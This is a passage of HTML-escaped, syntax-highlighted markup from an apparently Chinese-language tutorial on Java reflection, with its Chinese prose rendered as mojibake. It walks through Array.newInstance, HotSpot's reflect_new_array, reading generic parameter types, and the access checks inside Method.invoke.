&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">newInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">componentType&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">NegativeArraySizeException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">newArray&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">componentType&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">newArray&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">componentType&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">NegativeArraySizeException&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="n">arrayOop&lt;/span> &lt;span class="n">Reflection&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">reflect_new_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oop&lt;/span> &lt;span class="n">element_mirror&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jint&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TRAPS&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">element_mirror&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_NullPointerException&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_NegativeArraySizeException&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">java_lang_Class&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">is_primitive&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">element_mirror&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Klass&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">tak&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basic_type_mirror_to_arrayklass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">element_mirror&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CHECK_NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">TypeArrayKlass&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cast&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tak&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">allocate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">THREAD&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Klass&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">java_lang_Class&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">as_Klass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">element_mirror&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">oop_is_array&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">ArrayKlass&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cast&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">dimension&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">MAX_DIM&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_IllegalArgumentException&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">oopFactory&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">new_objArray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">THREAD&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Arrayç±»çš„set()å’Œget()æ–¹æ³•éƒ½ä¸ºNativeæ–¹æ³•ï¼Œåœ¨HotSpot JVMé‡Œåˆ†åˆ«å¯¹åº”Reflection::array_setå’ŒReflection::array_getæ–¹æ³•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å–æ³›å‹&lt;/p>
&lt;p>getGenericHelper(HashMap&amp;lt;String, Person&amp;gt; map)&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">getGenericType&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="n">TestHelper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDeclaredMethod&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;getGenericHelper&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">HashMap&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Type&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">genericParameterTypes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getGenericParameterTypes&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ£€éªŒæ˜¯å¦ä¸ºç©º
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="kc">null&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">genericParameterTypes&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">genericParameterTypes&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// å– getGenericHelper æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ParameterizedType&lt;/span> &lt;span class="n">parameterizedType&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="n">ParameterizedType&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="n">genericParameterTypes&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Type&lt;/span> &lt;span class="n">rawType&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parameterizedType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getRawType&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;----&amp;gt; rawType=&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">rawType&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Type&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">actualTypeArguments&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parameterizedType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getActualTypeArguments&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">actualTypeArguments&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="n">genericParameterTypes&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">actualTypeArguments&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ‰“å°å‡ºæ¯ä¸€ä¸ªç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">actualTypeArguments&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Type&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">actualTypeArguments&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;----&amp;gt; type=&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>
&lt;p>è·å¾— Metho,Field,Constructor çš„è®¿é—®æƒé™&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">modifiers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getModifiers&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Modifier&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">modifiers&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h3 id="invokeæ–¹æ³•">Invokeæ–¹æ³•&lt;/h3>
&lt;p>æ¯”è¾ƒé‡ç‚¹&lt;/p>
&lt;p>invokeæ–¹æ³•çš„å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@CallerSensitive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">...&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">IllegalArgumentException&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">InvocationTargetException&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">override&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">Reflection&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">quickCheckMemberAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">caller&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Reflection&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getCallerClass&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">checkAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MethodAccessor&lt;/span> &lt;span class="n">ma&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">methodAccessor&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// read volatile
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">ma&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ma&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">acquireMethodAccessor&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ma&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>
&lt;p>æƒé™æ£€æŸ¥&lt;/p>
&lt;p>é¦–å…ˆæ£€æŸ¥AccessibleObjectçš„overrideå±æ€§çš„å€¼ ã€‚AccessibleObject ç±»æ˜¯ Fieldã€Method å’Œ Constructor å¯¹è±¡çš„åŸºç±» ã€‚override é»˜è®¤ä¸ºfalse,è°ƒè¯•éœ€è¦æƒé™è°ƒç”¨è§„åˆ™ï¼Œåæ­£ä¸éœ€è¦ã€‚&lt;/p>
&lt;p>é»˜è®¤æƒ…å†µä¸‹é¦–å…ˆç”¨Reflection.quickCheckMemberAccess(clazz, modifiers)æ–¹æ³•æ£€æŸ¥æ–¹æ³•æ˜¯å¦ä¸ºpublicï¼Œå¦‚æœæ˜¯çš„è¯è·³å‡ºæœ¬æ­¥ï¼›å¦‚æœä¸æ˜¯publicæ–¹æ³•ï¼Œé‚£ä¹ˆç”¨Reflection.getCallerClass()æ–¹æ³•è·å–è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„Classå¯¹è±¡ï¼Œè¿™æ˜¯ä¸€ä¸ªnativeæ–¹æ³•:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@CallerSensitive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">getCallerClass&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
